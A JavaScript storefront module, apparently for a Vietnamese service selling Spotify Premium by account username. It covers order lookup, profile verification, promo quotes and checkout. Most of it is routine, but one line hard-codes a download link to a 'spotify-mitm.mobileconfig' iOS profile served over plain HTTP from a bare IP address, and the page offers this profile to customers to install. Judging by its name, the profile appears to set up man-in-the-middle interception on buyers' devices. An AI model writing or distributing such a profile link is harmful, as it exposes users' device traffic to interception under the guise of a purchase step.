import { SPOTIFY_PLANS, spotifyUid } from "./spotify.js";

export function initSpotify(api, { escapeHtml: esc, money, showPayment: renderPayment }) {
  const paymentCode = new URLSearchParams(location.search).get("order");
  if (paymentCode && document.querySelector(".spotify-container")) {
    const container = document.querySelector(".spotify-container");
    container.innerHTML = '<header class="spotify-hero"><span class="spotify-eyebrow">SPOTIFY PREMIUM</span><h1>Thanh toán Spotify</h1><p role="status" id="spotify-payment-loading">Đang tải đơn thanh toán…</p></header><div id="payment-result" class="payment-result" hidden></div>';
    const load = async () => {
      const message = document.querySelector("#spotify-payment-loading");
      try {
        if (!/^LG[A-Z0-9]{8}$/.test(paymentCode)) throw Error("Mã đơn không hợp lệ.");
        const order = await api(`/api/orders/${encodeURIComponent(paymentCode)}`);
        if (order.platform !== "Spotify") throw Error("Đây không phải đơn Spotify.");
        message.hidden = true; renderPayment(order);
      } catch (error) {
        message.textContent = error.message;
        const retry = document.createElement("button"); retry.type = "button"; retry.textContent = "Thử lại";
        retry.addEventListener("click", () => { retry.remove(); load(); }); message.after(retry);
      }
    };
    load(); return;
  }
  const form = document.querySelector("#spotify-form");
  if (!form) return;
  const input = form.elements.uid, coupon = form.elements.promo_code, pay = document.querySelector("#spotify-pay");
  const profileBox = document.querySelector("#spotify-profile"), lookupStatus = document.querySelector("#spotify-lookup-status");
  const quoteStatus = document.querySelector("#spotify-quote-status"), submitStatus = document.querySelector("#spotify-submit-status");
  let verified = null, lookupTimer, abort, lookupVersion = 0, quoteVersion = 0, creating = false;
  let quote = null, profileUrl = "http://103.101.161.228:8082/spotify-mitm.mobileconfig";
  const plan = () => SPOTIFY_PLANS.find(p => p.id === document.querySelector('input[name="spotify-plan"]:checked')?.value) || SPOTIFY_PLANS[0];
  const couponCode = () => coupon.value.trim().toUpperCase();
  const validQuote = () => quote && quote.plan.id === plan().id && (quote.promo_code || "") === couponCode();
  function summary() {
    const q = validQuote() ? quote : null;
    document.querySelector("#spotify-plan-name").textContent = plan().name;
    document.querySelector("#spotify-subtotal").textContent = money(q?.subtotal ?? plan().price);
    document.querySelector("#spotify-discount").textContent = money(q?.discount_amount ?? 0);
    document.querySelector("#spotify-total").textContent = money(q?.total ?? plan().price);
    pay.disabled = creating || !verified || verified.uid !== spotifyUid(input.value) || (!!couponCode() && !q);
  }
  input.addEventListener("input", () => {
    clearTimeout(lookupTimer); abort?.abort(); const version = ++lookupVersion;
    verified = null; profileBox.hidden = true; profileBox.replaceChildren(); summary();
    if (!input.value.trim()) { lookupStatus.textContent = ""; return; }
    const uid = spotifyUid(input.value);
    if (!uid) { lookupStatus.textContent = "Nhập Username hoặc link hồ sơ Spotify hợp lệ."; return; }
    lookupStatus.textContent = "Đang kiểm tra tài khoản…";
    const controller = new AbortController(); abort = controller;
    lookupTimer = setTimeout(async () => {
      try {
        const data = await api(`/api/spotify/lookup?uid=${encodeURIComponent(uid)}`, { signal: controller.signal });
        if (version !== lookupVersion || controller.signal.aborted) return;
        if (data.uid !== uid) throw Error("Kết quả tài khoản không khớp. Vui lòng kiểm tra lại.");
        if (data.lookup_status !== "found") {
          const detail = document.createElement("div"), name = document.createElement("strong"), username = document.createElement("small"), link = document.createElement("a");
          name.textContent = "Chưa lấy được tên và avatar";
          username.textContent = `UID: ${uid}`;
          link.href = `https://open.spotify.com/user/${encodeURIComponent(uid)}`; link.target = "_blank"; link.rel = "noopener noreferrer"; link.textContent = "Xem hồ sơ Spotify";
          detail.append(name, username, link); profileBox.replaceChildren(detail); profileBox.hidden = false;
          lookupStatus.textContent = "Spotify chưa cung cấp metadata hồ sơ. Vui lòng thử lại trước khi thanh toán.";
          return;
        }
        verified = data;
        const avatar = document.createElement("img");
        avatar.src = data.avatar || "/images/logo.png"; avatar.alt = ""; avatar.width = 52; avatar.height = 52; avatar.referrerPolicy = "no-referrer";
        avatar.addEventListener("error", () => { avatar.src = "/images/logo.png"; }, { once: true });
        const detail = document.createElement("div"), name = document.createElement("strong"), username = document.createElement("small");
        name.textContent = data.display_name; username.textContent = `UID: ${uid}`; detail.append(name, username);
        profileBox.replaceChildren(avatar, detail); profileBox.hidden = false;
        lookupStatus.textContent = "Đã tìm thấy tài khoản. Kiểm tra tên và avatar trước khi thanh toán.";
      } catch (error) { if (version === lookupVersion && !controller.signal.aborted) lookupStatus.textContent = error.message; }
      finally { if (version === lookupVersion) summary(); }
    }, 600);
  });
  async function updateQuote() {
    const version = ++quoteVersion, selected = plan().id, code = couponCode();
    quote = null; summary(); quoteStatus.textContent = "Đang kiểm tra giá…";
    try {
      const data = await api("/api/spotify/quote", { method: "POST", body: JSON.stringify({ plan_id: selected, promo_code: code }) });
      if (version !== quoteVersion || selected !== plan().id || code !== couponCode()) return;
      quote = data; quoteStatus.textContent = code ? `Đã áp dụng mã Spotify, giảm ${data.discount_percent}%.` : "";
    } catch (error) { if (version === quoteVersion) quoteStatus.textContent = error.message; }
    finally { if (version === quoteVersion) summary(); }
  }
  coupon.addEventListener("input", () => { ++quoteVersion; quote = null; quoteStatus.textContent = couponCode() ? "Bấm Áp dụng để kiểm tra mã Spotify." : ""; summary(); });
  document.querySelector("#spotify-apply").addEventListener("click", updateQuote);
  document.querySelectorAll('input[name="spotify-plan"]').forEach(radio => radio.addEventListener("change", updateQuote));
  document.querySelector("#spotify-paste").addEventListener("click", async () => {
    try { input.value = await navigator.clipboard.readText(); input.dispatchEvent(new Event("input")); }
    catch { lookupStatus.textContent = "Trình duyệt chưa cho phép đọc clipboard. Hãy dán trực tiếp vào ô tài khoản."; input.focus(); }
  });
  api("/api/spotify/plans").then(data => {
    try { const url = new URL(data.profile_url); if (["http:", "https:"].includes(url.protocol)) { profileUrl = url.href; document.querySelector("#spotify-profile-download").href = profileUrl; } } catch { /* Keep support link if not configured. */ }
  }).catch(() => { document.querySelector("#spotify-profile-status").textContent = "Chưa tải được link profile. Liên hệ hỗ trợ để nhận hướng dẫn."; });
  document.querySelector("#spotify-copy-profile").addEventListener("click", async () => {
    const status = document.querySelector("#spotify-profile-status");
    try { if (!profileUrl) throw Error(); await navigator.clipboard.writeText(profileUrl); status.textContent = "Đã chép link profile."; }
    catch { status.textContent = "Chưa chép được link. Bạn có thể nhấn giữ nút Tải profile để sao chép."; }
  });
  window.addEventListener("pagehide", () => { clearTimeout(lookupTimer); abort?.abort(); });
  form.addEventListener("submit", async e => {
    e.preventDefault(); if (pay.disabled || creating) return;
    const uid = verified?.uid, selected = plan();
    if (!uid || uid !== spotifyUid(input.value)) return;
    const paymentTab = window.open("about:blank", "_blank");
    if (paymentTab) paymentTab.opener = null;
    creating = true; summary(); submitStatus.textContent = "Đang tạo đơn thanh toán…";
    try {
      const order = await api("/api/spotify/orders", { method: "POST", body: JSON.stringify({ uid, plan_id: selected.id, promo_code: couponCode() }) });
      const paymentUrl = `/spotify/?order=${encodeURIComponent(order.code)}`;
      submitStatus.textContent = `Đã tạo đơn ${order.code}.`;
      const link = document.createElement("a"); link.href = paymentUrl; link.target = "_blank"; link.rel = "noopener"; link.textContent = " Mở trang thanh toán"; submitStatus.append(link);
      if (paymentTab && !paymentTab.closed) paymentTab.location.replace(paymentUrl);
      else location.assign(paymentUrl);
    } catch (error) { paymentTab?.close(); submitStatus.textContent = error.message; }
    finally { creating = false; summary(); }
  });
  summary();
}
